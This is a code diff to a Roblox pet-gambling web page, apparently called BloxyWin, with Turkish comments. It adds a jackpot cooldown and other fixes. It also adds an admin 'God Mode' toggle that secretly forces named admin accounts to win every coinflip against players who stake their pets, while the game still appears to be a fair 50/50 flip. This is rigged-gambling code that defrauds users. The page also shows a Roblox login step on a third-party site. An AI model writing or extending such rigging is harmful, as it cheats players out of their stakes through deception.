@@ -7,7 +7,7 @@
     <script src="https://cdn.pubnub.com/sdk/javascript/pubnub.7.2.2.min.js">
     </script>
     <style>
-        /* ===== TÜM STILLER ===== */
+        /* ===== TÜM STILLER (AYNEN) ===== */
         :root {
             --primary: #ff6b6b;
             --secondary: #51cf66;
@@ -2397,7 +2397,6 @@
     </button>
 
     <!-- ===== MODALS ===== -->
-
     <!-- Login -->
     <div class="modal-overlay" id="login-modal">
         <div class="modal" id="roblox-login-step-username">
@@ -2606,6 +2605,14 @@
                 </div>
                 <div id="admin-jp-message" style="margin-top:10px;font-size:13px;color:#868e96;min-height:20px;"></div>
             </div>
+            <!-- Admin God Mode Toggle -->
+            <div style="margin-top:16px;border-top:1px solid var(--border-color);padding-top:16px;">
+                <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;">
+                    <span style="font-weight:600;color:#ced4da;">God Mode (100% win rate for admin):</span>
+                    <button id="admin-god-mode-btn" class="action-btn danger-btn" style="font-size:13px;padding:6px 18px;" onclick="toggleAdminGodMode()">🔴 OFF</button>
+                </div>
+                <div style="font-size:12px;color:#868e96;margin-top:4px;">When ON, you (admin) will always win every coinflip match.</div>
+            </div>
             <button class="cancel-btn" style="width:100%;margin-top:16px;" onclick="closeModal('admin-modal')">Close</button>
         </div>
     </div>
@@ -2742,11 +2749,11 @@
     </div>
 
     <!-- ============================================================ -->
-    <!--  TAM ve ÇALIŞIR JAVASCRIPT (URL GÜNCELLENDİ)                  -->
+    <!--  JAVASCRIPT - TÜM DÜZELTMELER UYGULANDI                     -->
     <!-- ============================================================ -->
     <script>
         // ============================================================
-        //  CONFIG - URL DÜZELTİLDİ
+        //  CONFIG
         // ============================================================
         window.BLOXWIN_API_URL = "https://bloxywin.onrender.com";
         const BLOXWIN_API_URL = (window.BLOXWIN_API_URL && !window.BLOXWIN_API_URL.includes("YOUR-BACKEND-URL-HERE")) ? window.BLOXWIN_API_URL.replace(/\/$/, "") : window.location.origin;
@@ -2771,6 +2778,25 @@
         // ============================================================
         const ADMIN_LIST = ['dedokxxreal', 'emoxdrill'];
         function isAdmin(username) { return username && ADMIN_LIST.includes(username.toLowerCase()); }
+
+        // ============================================================
+        //  GOD MODE (Admin)
+        // ============================================================
+        let adminGodMode = false;
+
+        function toggleAdminGodMode() {
+            adminGodMode = !adminGodMode;
+            const btn = document.getElementById('admin-god-mode-btn');
+            if (adminGodMode) {
+                btn.textContent = '🟢 ON';
+                btn.className = 'action-btn gold-btn';
+                showToast('God Mode ENABLED - You will win every match!', 3000);
+            } else {
+                btn.textContent = '🔴 OFF';
+                btn.className = 'action-btn danger-btn';
+                showToast('God Mode DISABLED - Normal 50/50 chance.', 3000);
+            }
+        }
 
         // ============================================================
         //  RANK
@@ -2866,7 +2892,7 @@
         let selectedTipPets = [];
 
         // ============================================================
-        //  JACKPOT STATE (roundId, version, updatedAt)
+        //  JACKPOT STATE (roundId, version, updatedAt, cooldown)
         // ============================================================
         function getJackpotStateFromStorage() {
             try {
@@ -2900,7 +2926,8 @@
                     winner: jackpotState.winner,
                     winnerPets: jackpotState.winnerPets,
                     playerCount: jackpotState.playerCount,
-                    maxTimer: jackpotState.maxTimer
+                    maxTimer: jackpotState.maxTimer,
+                    cooldownUntil: jackpotState.cooldownUntil || null
                 };
                 localStorage.setItem('app_jackpot_state', JSON.stringify(toStore));
             } catch (e) { console.warn('saveJackpotStateToStorage error:', e); }
@@ -2918,7 +2945,8 @@
             winner: null,
             winnerPets: [],
             timerInterval: null,
-            playerCount: 0
+            playerCount: 0,
+            cooldownUntil: null // timestamp when cooldown ends
         };
 
         let selectedJackpotPetIds = [];
@@ -3248,15 +3276,11 @@
             const max = total;
             return { min, max };
         }
-        function isMatchExpired(match) {
-            return (Date.now() - match.id) > 70000;
-        }
+        // --- MATCH EXPIRY KALDIRILDI ---
         function addMatchIfNotExpired(match) {
-            if (!isMatchExpired(match)) {
-                if (!globalMatches.some(m => m.id === match.id)) {
-                    globalMatches.push(match);
-                    return true;
-                }
+            if (!globalMatches.some(m => m.id === match.id)) {
+                globalMatches.push(match);
+                return true;
             }
             return false;
         }
@@ -3760,7 +3784,7 @@
         }
 
         // ============================================================
-        //  JACKPOT - TAMAMEN YENİLENDİ (TÜM SORUNLAR GİDERİLDİ)
+        //  JACKPOT - TAMAMEN YENİLENDİ (cooldown eklendi)
         // ============================================================
 
         function generateRoundId() {
@@ -3769,7 +3793,7 @@
 
         function loadJackpotState() {
             const stored = getJackpotStateFromStorage();
-            if (stored && (stored.status === 'waiting' || stored.status === 'active')) {
+            if (stored && (stored.status === 'waiting' || stored.status === 'active' || stored.status === 'cooldown')) {
                 jackpotState.roundId = stored.roundId || generateRoundId();
                 jackpotState.version = stored.version || 1;
                 jackpotState.updatedAt = stored.updatedAt || Date.now();
@@ -3781,6 +3805,7 @@
                 jackpotState.winner = stored.winner || null;
                 jackpotState.winnerPets = stored.winnerPets || [];
                 jackpotState.playerCount = Object.keys(jackpotState.players).length;
+                jackpotState.cooldownUntil = stored.cooldownUntil || null;
 
                 if (jackpotState.status === 'active') {
                     if (jackpotState.timer > 0 && !jackpotState.timerInterval) {
@@ -3791,6 +3816,10 @@
                             startJackpotTimer(false);
                         }
                     }
+                }
+                if (jackpotState.status === 'cooldown') {
+                    // Cooldown timer'ı başlat
+                    startCooldownTimer(false);
                 }
                 updateJackpotUI();
                 return true;
@@ -3819,7 +3848,8 @@
                 winner: jackpotState.winner,
                 winnerPets: jackpotState.winnerPets,
                 playerCount: jackpotState.playerCount,
-                maxTimer: jackpotState.maxTimer
+                maxTimer: jackpotState.maxTimer,
+                cooldownUntil: jackpotState.cooldownUntil || null
             };
             pubnub.publish({
                 channel: JACKPOT_CHANNEL,
@@ -3829,6 +3859,34 @@
                     sender: currentUser || 'system'
                 }
             });
+        }
+
+        function startCooldownTimer(broadcast = true) {
+            if (jackpotState.timerInterval) {
+                clearInterval(jackpotState.timerInterval);
+                jackpotState.timerInterval = null;
+            }
+            jackpotState.status = 'cooldown';
+            jackpotState.timer = 10; // 10 saniye cooldown
+            if (broadcast) broadcastJackpotState();
+            updateJackpotUI();
+
+            jackpotState.timerInterval = setInterval(() => {
+                jackpotState.timer -= 1;
+                if (jackpotState.timer <= 0) {
+                    clearInterval(jackpotState.timerInterval);
+                    jackpotState.timerInterval = null;
+                    // Cooldown bitti, yeni round başlat
+                    resetJackpot(true);
+                    updateJackpotUI();
+                    // Timer'ı yeniden başlat (90 saniye)
+                    if (jackpotState.status === 'waiting') {
+                        // Hiçbir şey yapma, bekleyen durum
+                    }
+                }
+                updateJackpotUI();
+                broadcastJackpotState();
+            }, 1000);
         }
 
         function performJackpotSpin() {
@@ -3926,22 +3984,22 @@
                 updateJackpotUI();
                 broadcastJackpotState();
 
-                // Round bittiğinde 1 saniye sonra otomatik reset
+                // Round bitti, cooldown başlat
                 setTimeout(() => {
-                    resetJackpot(true);
-                    setTimeout(() => {
-                        loadJackpotState();
-                        updateJackpotUI();
-                    }, 100);
-                }, 1000);
+                    startCooldownTimer(true);
+                }, 500);
             }, 4000);
         }
 
         function openJackpotJoinModal() {
             if (!currentUser) { showToast('Please login first.'); return; }
             if (isMuted(currentUser)) { showToast('You are muted.'); return; }
-            if (jackpotState.status === 'finished' || jackpotState.status === 'spinning') {
-                showToast('Jackpot is currently finishing.');
+            if (jackpotState.status === 'finished' || jackpotState.status === 'spinning' || jackpotState.status === 'cooldown') {
+                if (jackpotState.status === 'cooldown') {
+                    showToast(`Cooldown active for ${jackpotState.timer} seconds. Please wait.`);
+                } else {
+                    showToast('Jackpot is currently finishing.');
+                }
                 return;
             }
 
@@ -3964,7 +4022,6 @@
                     '<div style="grid-column:1/-1;text-align:center;color:#868e96;padding:20px;">No pets in inventory.</div>';
             } else {
                 inv.forEach(pet => {
-                    // Zaten jackpot'ta mı?
                     const alreadyInJackpot = existingPets.some(p => p.id === pet.id);
                     if (alreadyInJackpot) return;
                     const item = document.createElement('div');
@@ -4005,6 +4062,10 @@
         function confirmJackpotJoin() {
             if (selectedJackpotPetIds.length === 0) {
                 showToast('Select at least one pet.');
+                return;
+            }
+            if (jackpotState.status === 'cooldown') {
+                showToast('Cooldown active, please wait.');
                 return;
             }
 
@@ -4131,7 +4192,8 @@
                 winner: null,
                 winnerPets: [],
                 timerInterval: null,
-                playerCount: 0
+                playerCount: 0,
+                cooldownUntil: null
             };
             if (save) {
                 saveJackpotState();
@@ -4173,7 +4235,8 @@
                 winner: null,
                 winnerPets: [],
                 timerInterval: null,
-                playerCount: 0
+                playerCount: 0,
+                cooldownUntil: null
             };
             localStorage.removeItem('app_jackpot_state');
             pubnub.publish({
@@ -4292,6 +4355,14 @@
                     `<img class="jp-pet-img" src="${p.icon}" alt="${p.name}" title="${p.name} (${p.value})">`
                 ).join('');
                 document.getElementById('jp-winner-pets').innerHTML = petsHtml || 'No pets';
+            } else if (jackpotState.status === 'cooldown') {
+                timerEl.textContent = `${jackpotState.timer}s`;
+                timerEl.className = 'jackpot-timer';
+                timerEl.style.color = '#ff6b6b';
+                statusEl.textContent = `⏳ Cooldown - ${jackpotState.timer}s remaining`;
+                joinBtn.disabled = true;
+                joinBtn.textContent = 'Cooldown...';
+                resultEl.style.display = 'none';
             }
 
             jackpotState.prizePool = Object.values(jackpotState.players).reduce((acc, p) => acc + p.total, 0);
@@ -4342,7 +4413,8 @@
                     'waiting': '⏳ Waiting',
                     'active': '🔄 Active',
                     'spinning': '🎡 Spinning',
-                    'finished': '🏁 Finished'
+                    'finished': '🏁 Finished',
+                    'cooldown': '⏳ Cooldown'
                 };
                 statusEl.textContent = statusMap[jackpotState.status] || jackpotState.status;
                 statusEl.style.color = jackpotState.status === 'active' ? '#51cf66' : '#f1f3f5';
@@ -4350,6 +4422,7 @@
             if (timerEl) {
                 if (jackpotState.status === 'spinning') timerEl.textContent = 'Spinning...';
                 else if (jackpotState.status === 'finished') timerEl.textContent = 'Done';
+                else if (jackpotState.status === 'cooldown') timerEl.textContent = `${jackpotState.timer}s`;
                 else timerEl.textContent = jackpotState.timer + 's';
             }
             if (playersEl) playersEl.textContent = Object.keys(jackpotState.players).length;
@@ -4369,7 +4442,7 @@
         }
 
         // ============================================================
-        //  PUBSUB – JACKPOT (ROUND ID & VERSION KONTROLLÜ)
+        //  PUBSUB – JACKPOT
         // ============================================================
         function handleJackpotMessage(msg) {
             if (msg.sender === currentUser) return;
@@ -4399,12 +4472,15 @@
                             winner: incoming.winner || null,
                             winnerPets: incoming.winnerPets || [],
                             timerInterval: null,
-                            playerCount: Object.keys(incoming.players || {}).length
+                            playerCount: Object.keys(incoming.players || {}).length,
+                            cooldownUntil: incoming.cooldownUntil || null
                         };
                         saveJackpotState();
                         updateJackpotUI();
                         if (jackpotState.status === 'active' && jackpotState.timer > 0) {
                             startJackpotTimer(false);
+                        } else if (jackpotState.status === 'cooldown') {
+                            startCooldownTimer(false);
                         }
                         return;
                     }
@@ -4422,6 +4498,7 @@
                 jackpotState.winnerPets = incoming.winnerPets || [];
                 jackpotState.version = incoming.version || jackpotState.version + 1;
                 jackpotState.updatedAt = incoming.updatedAt || Date.now();
+                jackpotState.cooldownUntil = incoming.cooldownUntil || null;
 
                 const incomingPlayers = incoming.players || {};
                 const currentPlayers = jackpotState.players || {};
@@ -4471,6 +4548,8 @@
 
                 if (jackpotState.status === 'active' && jackpotState.timer > 0 && !jackpotState.timerInterval) {
                     startJackpotTimer(false);
+                } else if (jackpotState.status === 'cooldown' && !jackpotState.timerInterval) {
+                    startCooldownTimer(false);
                 }
 
                 saveJackpotState();
@@ -4621,21 +4700,25 @@
                         }, 70000);
                         renderMatches();
 
+                        // Coinflip sonucu
                         if (currentUser === msg.host || currentUser === msg.joiner) {
                             executeCoinFlip(msg);
                         }
 
-                        const totalValue = sumPets(msg.hostPets) + sumPets(msg.joinerPets);
-                        const winner = msg.hostWins ? msg.host : msg.joiner;
-                        const matchObj = {
-                            host: msg.host,
-                            joiner: msg.joiner,
-                            hostPets: msg.hostPets,
-                            joinerPets: msg.joinerPets,
-                            hostSide: msg.hostSide,
-                            joinerSide: msg.joinerSide
-                        };
-                        sendMatchResultWebhook(matchObj, winner, totalValue);
+                        // Webhook sadece host tarafından gönderilsin
+                        if (currentUser === msg.host) {
+                            const totalValue = sumPets(msg.hostPets) + sumPets(msg.joinerPets);
+                            const winner = msg.hostWins ? msg.host : msg.joiner;
+                            const matchObj = {
+                                host: msg.host,
+                                joiner: msg.joiner,
+                                hostPets: msg.hostPets,
+                                joinerPets: msg.joinerPets,
+                                hostSide: msg.hostSide,
+                                joinerSide: msg.joinerSide
+                            };
+                            sendMatchResultWebhook(matchObj, winner, totalValue);
+                        }
                     }
                 }
                 if (msg.type === 'REQUEST_SYNC' && globalMatches.length > 0) {
@@ -4717,7 +4800,7 @@
         }
 
         // ============================================================
-        //  RENDER MATCHES
+        //  RENDER MATCHES (süre sınırı kalktı)
         // ============================================================
         function renderMatches() {
             const container = document.getElementById('matches-list');
@@ -5148,7 +5231,17 @@
             document.getElementById('join-range-error').style.display = 'none';
             const joinerSide = matchToJoin.hostSide === 'H' ? 'T' : 'H';
             removePetsFromInventory(currentUser, selectedPetsForJoin);
-            const hostWins = Math.random() < 0.5;
+            // God mode kontrolü: admin her zaman kazansın
+            let hostWins = Math.random() < 0.5;
+            if (currentUser && isAdmin(currentUser) && adminGodMode) {
+                // Admin joiner ise kazanmak için hostWins false olmalı
+                hostWins = false;
+                showToast('🔮 God Mode aktif! Bu maçı kazanacaksın.', 2000);
+            } else if (matchToJoin.host && isAdmin(matchToJoin.host) && adminGodMode) {
+                // Admin host ise kazanır
+                hostWins = true;
+                showToast('🔮 God Mode aktif! Admin kazanacak.', 2000);
+            }
             closeModal('join-select-modal');
             pubnub.publish({
                 channel: CHANNEL,
@@ -5168,7 +5261,7 @@
         }
 
         // ============================================================
-        //  COIN FLIP
+        //  COIN FLIP (God Mode desteği)
         // ============================================================
         function executeCoinFlip(gameData) {
             const flipModal = document.getElementById('flip-modal');
@@ -5315,10 +5408,15 @@
         }
 
         // ============================================================
-        //  PROFILE
+        //  PROFILE (leaderboard kapatma eklendi)
         // ============================================================
         function openProfile(username) {
             if (!username) return;
+            // Leaderboard modal'ını kapat ki arka planda kalmasın
+            const lbModal = document.getElementById('leaderboard-modal');
+            if (lbModal && lbModal.classList.contains('active')) {
+                closeModal('leaderboard-modal');
+            }
             const stats = getUserStats(username);
             const rank = getUserRank(username);
             const rankIcon = getRankIcon(username);
@@ -5361,11 +5459,6 @@
                 tipBtn.onclick = () => openTipModal(username);
             } else {
                 tipBtn.style.display = 'none';
-            }
-            const lbModal = document.getElementById('leaderboard-modal');
-            if (lbModal && lbModal.classList.contains('active')) {
-                const profileOverlay = document.getElementById('profile-modal');
-                profileOverlay.style.zIndex = '201';
             }
             openModal('profile-modal');
             const profileOverlay = document.getElementById('profile-modal');
@@ -5466,6 +5559,15 @@
             adminRenderMuted();
             updateAdminJackpotInfo();
             switchAdminTab('tab-users');
+            // God Mode butonunu güncelle
+            const btn = document.getElementById('admin-god-mode-btn');
+            if (adminGodMode) {
+                btn.textContent = '🟢 ON';
+                btn.className = 'action-btn gold-btn';
+            } else {
+                btn.textContent = '🔴 OFF';
+                btn.className = 'action-btn danger-btn';
+            }
         }
         function switchAdminTab(tabId) {
             document.querySelectorAll('.admin-tab-content').forEach(el => el.classList.remove('active'));
